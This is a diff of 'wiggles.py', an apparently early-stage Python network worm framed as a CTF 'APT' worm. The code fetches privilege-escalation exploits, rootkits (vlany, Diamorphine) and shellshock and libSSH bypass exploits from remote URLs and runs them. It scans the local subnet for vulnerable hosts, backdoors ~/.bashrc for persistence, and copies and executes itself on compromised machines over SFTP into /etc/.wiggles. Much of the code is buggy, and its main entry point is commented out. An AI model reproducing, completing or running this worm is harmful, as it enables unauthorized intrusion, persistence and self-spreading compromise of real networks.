@@ -2,7 +2,7 @@
 """
 #****************************************************************#
 #           Author(s)     - pyCity                               #
-#           Date          - 2/27/2019                            #
+#           Date          - 3/8/2019                             #
 #           Version       - 1.0                                  #
 #                                                                #
 #           Usage         - python3 wiggles.py                   #
@@ -10,118 +10,129 @@
 #           Goal          - 'APT' worm for dropping in CTFs      #
 #                                                                #
 #           Description   - Python network worm with persistence #
+#                         - Very early in development, much of   #
+#                           this code haven't been fully tested  #
 #                                                                #
 #****************************************************************#
 """
 # ----------------------------------------------------------------------------------------------------------------------
-# IMPORTS
-
 import os
 import sys
 import nmap
-import netifaces
-import pysftp
-import ipaddress
-import distro
+import pysftp     # Wrapper for Paramiko's sftp
+import ipaddress  # Used to find subnet
+import distro     # Info about OS distribution
 import logging
 import coloredlogs
 import requests
-import platform
 import subprocess
 
 from shutil import copyfile
+from platform import platform
+from netifaces import interfaces, ifaddresses
+from Crypto.PublicKey import RSA  # For generating public/private keys
 
+# ARTWORK---------------------------------------------------------------------------------------------------------------
 
-# ----------------------------------------------------------------------------------------------------------------------
-# ARTWORK
-
-artwork = """                  
-                                      .
-                                   .OO
-                                 .OOOO
-                                .OOOO'
-                                OOOO'          .-~~~~-.
-                                OOO'          /   (o)(o)
-                        .OOOOOO `O .OOOOOOO. /      .. |
-                    .OOOOOOOOOOOO OOOOOOOOOO/\    \____/
-                  .OOOOOOOOOOOOOOOOOOOOOOOO/ #\   ,\_/
-                 .OOOOOOO%%OOOOOOOOOOOOO(#/\     /.
-                .OOOOOO%%%OOOOOOOOOOOOOOO\ #\  \/OO.                                                           ___ 
-               .OOOOO%%%%OOOOOOOOOOOOOOOOO\   \/OOOO.                                                         /~~ )
-               OOOOO%%%%OOOOOOOOOOOOOOOOOOO\_\/\OOOOO           ____                                         /'o  |
-               OOOOO%%%OOOOOOOOOOOOOOOOOOOOO\###)OOOO         .';;|;;\            _,-;;;\;-_               ,'  _/'|
-               OOOOOO%%OOOOOOOOOOOOOOOOOOOOOOOOOOOOOO        `\_/;;;/;\         /;;\;;;;\;;;,             |     .'
-               OOOOOOO%OOOOOOOOOOOOOOOOOOOOOOOOOOOOOO            `;/;;;|      ,;\;;;|;;;|;;;|;\          ,';;\  |
-               `OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO'             |;;;/;:     |;;;\;/~~~~\;/;;;|        ,;;;;;;.'
-             .-~~\OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO'             |;/;;;|     |;;;,'      `\;;/;|      /;\;;;;/
-            / _/  `\(#\OOOOOOOOOOOOOOOOOOOOOOOOOOOO'               `|;;;/;\___/;~\;|         |;;;;;----\;;;|;;/'
-           / / \  / `~~\OOOOOOOOOOOOOOOOOOOOOOOOOO'                 `;/;;;|;;;|;;;,'         |;;;;|;;;;;|;;|/'
-          |/'  `\//  #\ \OOOOOOOOOOOOOOOOOOOOOOOO'                   `\;;;|;;;/;;,'           `\;/;;;;;;|/~'
-          '      `-.__\_,\OOOOOOOOOOOOOOOOOOOOO'                       `\/;;/;;;/               `~------'
-                     `OO\#)OOOOOOOOOOOOOOOOOOO'                          `~~~~~ 
-                       `OOOOOOOOO''OOOOOOOOO'
-                         `""""""'  `""""""'
-  
-WWWWWWWW                           WWWWWWWWIIIIIIIIII      GGGGGGGGGGGGG        GGGGGGGGGGGGGLLLLLLLLLLL             EEEEEEEEEEEEEEEEEEEEEE   SSSSSSSSSSSSSSS 
-W::::::W                           W::::::WI::::::::I   GGG::::::::::::G     GGG::::::::::::GL:::::::::L             E::::::::::::::::::::E SS:::::::::::::::S
-W::::::W                           W::::::WI::::::::I GG:::::::::::::::G   GG:::::::::::::::GL:::::::::L             E::::::::::::::::::::ES:::::SSSSSS::::::S
-W::::::W                           W::::::WII::::::IIG:::::GGGGGGGG::::G  G:::::GGGGGGGG::::GLL:::::::LL             EE::::::EEEEEEEEE::::ES:::::S     SSSSSSS
- W:::::W           WWWWW           W:::::W   I::::I G:::::G       GGGGGG G:::::G       GGGGGG  L:::::L                 E:::::E       EEEEEES:::::S            
-  W:::::W         W:::::W         W:::::W    I::::IG:::::G              G:::::G                L:::::L                 E:::::E             S:::::S            
-   W:::::W       W:::::::W       W:::::W     I::::IG:::::G              G:::::G                L:::::L                 E::::::EEEEEEEEEE    S::::SSSS         
-    W:::::W     W:::::::::W     W:::::W      I::::IG:::::G    GGGGGGGGGGG:::::G    GGGGGGGGGG  L:::::L                 E:::::::::::::::E     SS::::::SSSSS    
-     W:::::W   W:::::W:::::W   W:::::W       I::::IG:::::G    G::::::::GG:::::G    G::::::::G  L:::::L                 E:::::::::::::::E       SSS::::::::SS  
-      W:::::W W:::::W W:::::W W:::::W        I::::IG:::::G    GGGGG::::GG:::::G    GGGGG::::G  L:::::L                 E::::::EEEEEEEEEE          SSSSSS::::S 
-       W:::::W:::::W   W:::::W:::::W         I::::IG:::::G        G::::GG:::::G        G::::G  L:::::L                 E:::::E                         S:::::S
-        W:::::::::W     W:::::::::W          I::::I G:::::G       G::::G G:::::G       G::::G  L:::::L         LLLLLL  E:::::E       EEEEEE            S:::::S
-         W:::::::W       W:::::::W         II::::::IIG:::::GGGGGGGG::::G  G:::::GGGGGGGG::::GLL:::::::LLLLLLLLL:::::LEE::::::EEEEEEEE:::::ESSSSSSS     S:::::S
-          W:::::W         W:::::W          I::::::::I GG:::::::::::::::G   GG:::::::::::::::GL::::::::::::::::::::::LE::::::::::::::::::::ES::::::SSSSSS:::::S
-           W:::W           W:::W           I::::::::I   GGG::::::GGG:::G     GGG::::::GGG:::GL::::::::::::::::::::::LE::::::::::::::::::::ES:::::::::::::::SS 
-            WWW             WWW            IIIIIIIIII      GGGGGG   GGGG        GGGGGG   GGGGLLLLLLLLLLLLLLLLLLLLLLLLEEEEEEEEEEEEEEEEEEEEEE SSSSSSSSSSSSSSS   
-
+artwork = """
+                                                 __
+                                                /~~\ 
+  ____                                         /'o  |
+.';;|;;\            _,-;;;\;-_               ,'  _/'|
+`\_/;;;/;\         /;;\;;;;\;;;,             |     .'
+    `;/;;;|      ,;\;;;|;;;|;;;|;\          ,';;\  |
+     |;;;/;:     |;;;\;/~~~~\;/;;;|        ,;;;;;;.'
+     |;/;;;|     |;;;,'      `\;;/;|      /;\;;;;/
+      `|;;;/;\___/;~\;|         |;;;;;----\;;;|;;/'
+       `;/;;;|;;;|;;;,'         |;;;;|;;;;;|;;|/'
+        `\;;;|;;;/;;,'           `\;/;;;;;;|/~'
+          `\/;;/;;;/               `~------'
+            `~~~~~  
+██╗    ██╗██╗ ██████╗  ██████╗ ██╗     ███████╗███████╗
+██║    ██║██║██╔════╝ ██╔════╝ ██║     ██╔════╝██╔════╝
+██║ █╗ ██║██║██║  ███╗██║  ███╗██║     █████╗  ███████╗
+██║███╗██║██║██║   ██║██║   ██║██║     ██╔══╝  ╚════██║
+╚███╔███╔╝██║╚██████╔╝╚██████╔╝███████╗███████╗███████║
+ ╚══╝╚══╝ ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚══════╝
 """
 
-# ----------------------------------------------------------------------------------------------------------------------
-# LOGGING
+# LOGGING---------------------------------------------------------------------------------------------------------------
 
 logger = logging.getLogger(__name__)
 coloredlogs.install(level='DEBUG', logger=logger)
 
-# ----------------------------------------------------------------------------------------------------------------------
-# VARIABLES
+
+# VARIABLES-------------------------------------------------------------------------------------------------------------
 
 nm = nmap.PortScanner()
+private_key = "id_rsa"      # ssh_keygen("private") Temporary
+public_key = "id_rsa.pub"   # ssh_keygen("public")  Temporary
 
-private_key = "id_rsa"
-public_key = "id_rsa.pub"
 
-# ----------------------------------------------------------------------------------------------------------------------
-# EXPLOIT SOURCES
+# SOURCES---------------------------------------------------------------------------------------------------------------
 
 urls = {
-    "dirty_sockv2.py"      : "https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py",
-    "vlany"                : "https://gist.githubusercontent.com/mempodippy/d93fd99164bace9e63752afb791a896b/raw/"
-                             "6b06d235beac8590f56c47b7f46e2e4fac9cf584/quick_install.sh",
-    "libsshauthbypass.py"  : "https://raw.githubusercontent.com/blacknbunny/libSSH-Authentication-Bypass/master"
-                             "/libsshauthbypass.py"
+    # Priv esc
+    "dirty_sockv2.py" : "https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py",
+    "mac_privs"       : "https://github.com/thehappydinoa/rootOS",
+
+    # Rootkits
+    "vlany"           : "https://gist.githubusercontent.com/mempodippy/d93fd99164bace9e63752afb791a896b/raw/"
+                        "6b06d235beac8590f56c47b7f46e2e4fac9cf584/quick_install.sh",
+    "diamorphine"     : "https://github.com/m0nad/Diamorphine",
+
+    # Exploits
+    "libsshauthbypass.py": "https://raw.githubusercontent.com/blacknbunny/libSSH-Authentication-Bypass/master"
+                           "/libsshauthbypass.py",
+    "shocker"            : "https://raw.githubusercontent.com/nccgroup/shocker/master/shocker.py",
+
 }
+
 # TODO - Find common vulns that i can easily verify with nmap scripts
 
-# ----------------------------------------------------------------------------------------------------------------------
-# FUNCTIONS
+# FUNCTIONS-------------------------------------------------------------------------------------------------------------
+
+# Hard-coded key may be better, generated key for spreading. Use requests to grab key from c2
+
+
+def ssh_keygen(keytype):
+    """Generate public or private RSA key, return the key's absolute path"""
+
+    key = RSA.generate(4096)
+    if keytype == "private":
+        with open("private.pem", "wb") as f:
+            f.write(key.export_key("PEM"))
+        return os.path.abspath(f)
+
+    elif keytype == "public:":
+        pubkey = key.publickey()
+        with open("public.pem", "wb") as f:
+            f.write(pubkey.exportKey("OpenSSH"))
+        return os.path.abspath(f)
 
 
 def download_file(url, file):
-    """Download file from url, save to disk. Return the file's full location"""
-    logger.debug("Downloading {} from {}".format(file, url))
+    """Download file from url, save to disk. Return the file's absolute path"""
+
+    logger.info("Downloading {} from {}".format(file, url))
     with requests.get(url) as r:
         with open(file, "w") as f:
             f.write(r.text)
             logger.debug("Download successful: {}".format(f.name))
-            return f.name
+    return f.name
 
-# ----------------------------------------------------------------------------------------------------------------------
-# CLASSES
+
+def sftp_file(host, user, private_key, remote_file, local_dir):
+    """Download a file via SFTP from a remote host, return the file"""
+
+    logger.debug("SFTPing {} from {}:{}".format(remote_file, user, host))
+    with pysftp.Connection(host, user, private_key) as sftp:
+        with sftp.chdir(local_dir):
+            sftp.get(remote_file)
+    return remote_file
+
+
+# CLASSES---------------------------------------------------------------------------------------------------------------
 
 
 class Agent:
@@ -150,22 +161,22 @@ class Agent:
     def __init__(self):
         self.username = "dirty_sock"
         self.password = "dirty_sock"
-        self.ip = self.public_ip()    # Public IP address of Agent
-        self.dist = distro.linux_distribution(full_distribution_name=False)  # Linux distribution for agent
-        self.platform = platform.platform()  # Platform and uname info for agent
-        self.uid = os.getuid()        # UID of agent (0 for root)
+        self.ip = self.public_ip()  # Public IP address of Agent
+        self.dist = distro.linux_distribution(full_distribution_name=False)  # Linux distribution
+        self.platform = platform()  # Platform and uname info
+        self.uid = os.getuid()      # UID of agent (0 for root)
 
     @staticmethod
     def public_ip():
         """Get device's public IP address for communication with C2"""
 
         try:
-            logger.debug("Looking up public IP")
+            logger.info("Looking up public IP")
             with requests.get("https://api.ipify.org") as ip:
                 logger.debug("Public IP: {}".format(ip.text))
                 return ip
         except requests.exceptions.ConnectionError as err:
-            logger.error("Must have an internet connection to run.\n{}".format(err))
+            logger.fatal("Must have an internet connection to run.\n{}".format(err))
             exit(1)
 
     @staticmethod
@@ -180,7 +191,7 @@ class Agent:
         url = urls.get("dirty_sockv2.py")
         file_name = url.split("/")[-1]
 
-        logger.debug("Checking if host is vulnerable to dirty_sock")
+        logger.info("Checking if host is vulnerable to dirty_sock")
         if subprocess.run("which snap", shell=True):
             logger.debug("Host is vulnerable! Downloading exploit")
             file_path = download_file(url, file_name)
@@ -194,7 +205,7 @@ class Agent:
         url = urls.get("vlany")
         file_name = url.split("/")[-1]
 
-        logger.debug("Checking if host is vulnerable to vlany")
+        logger.info("Checking if host is vulnerable to vlany")
         if "x86_64" in self.platform:
             logger.debug("Agent is vulnerable!")
             file_path = download_file(url, file_name)
@@ -225,7 +236,8 @@ class Agent:
         # Backdoor /home/$USER/.bashrc
         else:
             with open(self.expand_path("~/.bashrc"), "a") as f:
-                f.write("\n(if [ $(ps aux|grep "+os.path.basename(sys.argv[0])+"|wc -l) -lt 2 ]; then "+worm_path+";fi&)\n")
+                f.write("\n(if [ $(ps aux|grep " + os.path.basename(
+                    sys.argv[0]) + "|wc -l) -lt 2 ]; then " + worm_path + ";fi&)\n")
 
 
 class SideChain:
@@ -257,7 +269,7 @@ class SideChain:
 #                                                                                                    #
 #   exploit_libssh   - Fire libsshbypass at vulnerable hosts                                         #
 #                                                                                                    #
-#   exec_code        - Download and execute wiggles.py to successfully exploited hosts               #
+#   infect_hosts     - Download and execute wiggles.py to successfully exploited hosts               #
 #                                                                                                    #
 #****************************************************************************************************#
     """
@@ -268,9 +280,13 @@ class SideChain:
         self.ip = self.private_ip()
         self.subnet = self.get_subnet()
         self.live_hosts = self.ping_subnet()
-        self.sshock_hosts = self.scan_shellshock()
-        self.libssh_exploit = self.download_libssh()
-        self.ssh_hosts = self.scan_libssh()
+
+        # If any hosts are available, begin scanning for exploits
+        if self.live_hosts:
+            self.sshock_exploit = self.download_shocker()
+            self.libssh_exploit = self.download_libssh()
+            self.sshock_hosts = self.scan_shellshock()
+            self.ssh_hosts = self.scan_libssh()
 
     @staticmethod
     def private_ip():
@@ -278,9 +294,9 @@ class SideChain:
            Loop through each network interface (eth1, wlo1, etc) to find the
            current machine's internet connection, extract IP from there"""
 
-        network_interfaces = netifaces.interfaces()
+        network_interfaces = interfaces()
         for i in network_interfaces:
-            address = netifaces.ifaddresses(i)[2][0]['addr']
+            address = ifaddresses(i)[2][0]['addr']
             if address != "127.0.0.1" or "127.0.1.1":
                 priv_ip = address
                 logger.debug("Private IP: {}".format(priv_ip))
@@ -290,6 +306,7 @@ class SideChain:
     def get_subnet():
         """ Using the private IP, generate the proper subnet"""
 
+        #TODO write this function using ipaddress module
         subnet = ipaddress.ip_network("10.0.0.0/24")
         logger.debug("Subnet: {}".format(subnet))
         return subnet
@@ -297,13 +314,12 @@ class SideChain:
     def ping_subnet(self):
         """Ping scan all hosts in the same network, return an array of all hosts"""
 
+        # Ping each host
         nm.scan(str(self.subnet), arguments="-sn")
 
-        # Create a tuple of alive hosts using a generator - outputs ("10.0.0.1", "up")
+        # Create a tuple of alive hosts using a generator - output ("10.0.0.1", "up")
         live_hosts = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]
-
-        # Generate a list of the first element (ip) of each tuple in live_hosts
-        logger.debug("Available Hosts: {}\n".format([host[0] for host in live_hosts]))
+        logger.debug("Available Hosts: {}".format([host[0] for host in live_hosts]))
         return live_hosts
 
     def scan_shellshock(self):
@@ -311,8 +327,8 @@ class SideChain:
 
         vuln_hosts = []
 
-        logger.debug("Scanning live hosts for ShellShock")
-        for host in self.live_hosts: # Get the first element each host ("10.0.0.1", "up")
+        logger.info("Scanning live hosts for ShellShock")
+        for host in self.live_hosts:  # Get the first element each host ("10.0.0.1", "up")
             results = nm.scan(host[0], ports="1-1024", arguments="--script=http-shellshock")
             if "VULNERABLE" in results:
                 vuln_hosts.append(host[0])
@@ -324,12 +340,12 @@ class SideChain:
 
         vuln_hosts = []
 
-        logger.debug("Scanning hosts for HeartBleed")
+        logger.info("Scanning hosts for HeartBleed")
         for host in self.live_hosts:
             results = nm.scan(host[0], ports="80,443,445", arguments="-sV --script=ssl-heartbleed")
             if "VULNERABLE" in results:
                 vuln_hosts.append(host[0])
-        logger.debug("Hosts vulnerable to HeartBleed: {}\n".format(vuln_hosts))
+        logger.debug("Hosts vulnerable to HeartBleed: {}".format(vuln_hosts))
         return vuln_hosts
 
     def scan_libssh(self):
@@ -337,26 +353,57 @@ class SideChain:
 
         vuln_hosts = []
 
-        logger.debug("Scanning for hosts with port 22 open")
+        logger.info("Scanning for hosts with port 22 open")
         for host in self.live_hosts:
             nm.scan(host[0], ports="22", arguments="-sC")
             if host[1] == "up":
                 vuln_hosts.append(host[0])
-        logger.debug("Vulnerable hosts: {}".format(vuln_hosts))
+        logger.debug("Hosts vulnverable to libsshbypass: {}".format(vuln_hosts))
         return vuln_hosts
 
     def download_libssh(self):
         """Download LibSSH Auth Bypass from exploit DB, save to disk"""
 
+        local_file = "/home/dylan/PycharmProjects/Wiggles/libsshauthbypass.py"  # TEMPORARY!
+        if os.path.isfile(local_file):
+            logger.debug("Exploit already downloaded")
+            return local_file
+        else:
             url = urls.get("libsshauthbypass.py")
             file_name = url.split("/")[-1]
             local_file = download_file(url, file_name)
             subprocess.check_output(["python", local_file])
             return local_file
 
+    def download_shocker(self):
+        """Download shellshock exploit from GitHub, save to disk"""
+
+        url = urls.get("shocker")
+        file_name = url.split("/")[-1]
+        local_file = download_file(url, file_name)
+        subprocess.check_output(["python", local_file])
+        return local_file
+
     def exploit_shellshock(self):
         """Exploit targets vulnerable to shellshock"""
-        pass
+
+        infected_hosts = []
+
+        logger.debug("Firing shellshock at  vulnerable hosts")
+        for host in self.sshock_hosts:
+            try:
+                # Temporary
+                with subprocess.run("python {} --host {} --command {}".format(self.sshock_exploit,
+                                                                              host, "id"),shell=True, timeout=15) as proc:
+                    if proc == 0:
+                        logger.debug("{} successfully exploited".format(host))
+                        infected_hosts.append(host)
+            except subprocess.CalledProcessError as err:
+                logger.error(err)
+            except subprocess.TimeoutExpired as err:
+                logger.error(err)
+        logger.debug("Targets exploited by shellshock: {}".format(infected_hosts))
+        return infected_hosts
 
     def exploit_libssh(self):
         """Exploit hosts with libssh_bypass"""
@@ -366,35 +413,37 @@ class SideChain:
         logger.debug("Firing libsshbypass at vulnerable hosts")
         for host in self.ssh_hosts:
             try:
-                output = subprocess.run("python {} --host {} >/dev/null 2>&1".format(self.libssh_exploit, host),
-                                        shell=True, timeout=10)
-                if output == 0:
-                    logger.debug("{} may be vulnerable".format(host))
-                    infected_hosts.append(host)
+                with subprocess.run("python {} --host {} >/dev/null 2>&1".format(self.libssh_exploit,
+                                                                                 host), shell=True, timeout=10) as proc:
+                    if proc == 0:
+                        logger.debug("{} successfully exploited".format(host))
+                        infected_hosts.append(host)
             except subprocess.CalledProcessError as err:
                 logger.error(err)
             except subprocess.TimeoutExpired as err:
                 logger.error(err)
-        logger.debug("Targets exploited by libssh_bypass: {}\n".format(infected_hosts))
+        logger.debug("Targets exploited by libssh_bypass: {}".format(infected_hosts))
         return infected_hosts
 
-    def exec_code(self, host, payload):
-        """Login to a server and execute payload"""
+    def exec_code(self, host):
+        """Login to a server and execute code"""
 
+        # Payload is this worm for now, since it has built-in persistence
+        payload = os.path.abspath(sys.argv[0])
         with pysftp.Connection(host=host, private_key=private_key) as sftp:
-            if sftp.exists("/etc/.wiggles"):
-                with sftp.cd("/etc/.wiggles"):
-                    sftp.get(payload)
-                    sftp.execute(payload)
-            else:
+            if not sftp.exists("/etc/.wiggles"):
                 sftp.mkdir("/etc/.wiggles")
+            with sftp.cd("/etc/.wiggles"):
+                sftp.put(payload)
+                sftp.execute(payload)
 
 
 # ----------------------------------------------------------------------------------------------------------------------
 
 def main():
 
-    if "Linux" in platform.platform():
+    if "Linux" in platform():
+
         agent_1 = Agent()
 
         # If we don't have root, attempt priv esc
@@ -420,14 +469,14 @@ def main():
         if worm_1.sshock_hosts:
             worm_1.exploit_shellshock()
 
-    elif "Windows" in platform.platform():
+    elif "Windows" in platform():
         pass
 
-    elif "OSX" in platform.platform():
+    elif "OSX" in platform():
         pass
 
 
 if __name__ == "__main__":
     logger.debug(artwork)
-    logger.fatal(["DO NOT RUN ME ON CAMPUS!" for i in range(10)])
+    logger.fatal(["DO NOT RUN ME ON CAMPUS!" for i in range(15)])
     # main()
